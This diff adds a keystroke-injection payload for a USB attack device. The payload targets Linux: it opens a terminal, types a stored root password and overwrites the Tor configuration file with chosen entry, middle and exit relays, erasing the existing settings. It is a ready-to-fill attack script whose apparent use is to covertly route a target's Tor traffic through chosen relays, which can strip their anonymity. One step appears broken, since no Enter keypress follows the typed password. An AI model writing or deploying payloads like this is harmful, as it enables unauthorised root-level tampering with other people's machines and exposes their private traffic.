@@ -1,0 +1,51 @@
+QUACK REM ################################################################
+QUACK REM #                                                              |
+QUACK REM # Title        : Set An Arbitrary And Persistent Tor Circuit   |
+QUACK REM # Author       : Aleff                                         |
+QUACK REM # Version      : 1.0                                           |
+QUACK REM # Category     : Execution                                     |
+QUACK REM # Target       : Linux                                         |
+QUACK REM #                                                              |
+QUACK REM ################################################################
+
+ATTACKMODE HID
+
+QUACK REM REQUIREMENTS:
+QUACK REM - Tor installed
+QUACK REM - Fingerprints of your relays
+
+QUACK REM NOTE:
+QUACK REM - Payload tested using TorBrowser 13.0.8 based on Mozilla Firefoz 115.6.0esr ENG
+QUACK REM - Payload tested on Debian 12_eng; Ubuntu 23.10_eng;
+
+QUACK REM VARIABLES
+QUACK REM 1) Activation of administrator permissions may vary from system to system. For example, for Debian it is necessary to use 'su' while for other systems such as Ubuntu it is necessary to use 'sudo su'. In general this can vary and is information that could be crucial in case the target has tampered with this functionality.
+QUACK REM i.e. sudo su
+ROOT_PERMISSION_COMMAND='sudo su'
+QUACK REM 2) Edit this field only if you plan to use this script on Linux operating systems as you need administrator permissions and therefore you need to know the password.
+ROOT_PASSWORD='here'
+QUACK REM 3) Set the Fingerprints #EntryNode #MiddleNode #ExitNode
+ENTRY_NODE='here'
+MIDDLE_NODE='here'
+EXIT_NODE='here'
+
+QUACK DELAY 2000
+QUACK REM Opens a new terminal and login with administrator permissions.
+QUACK CTRL-ALT t
+QUACK STRING $ROOT_PERMISSION_COMMAND
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING $ROOT_PASSWORD
+QUACK DELAY 1000
+QUACK REM Writes the new configuration into the torrc file deleting all the previous settings.
+QUACK STRING echo \"EntryNodes $ENTRY_NODE
+QUACK ENTER
+QUACK STRING MiddleNodes $MIDDLE_NODE
+QUACK ENTER
+QUACK STRING ExitNodes $EXIT_NODE\" > /etc/tor/torrc
+QUACK ENTER
+QUACK REM Then exit from the super user and close the terminal
+QUACK DELAY 500
+QUACK STRING exit
+QUACK ENTER
+QUACK ALT F4
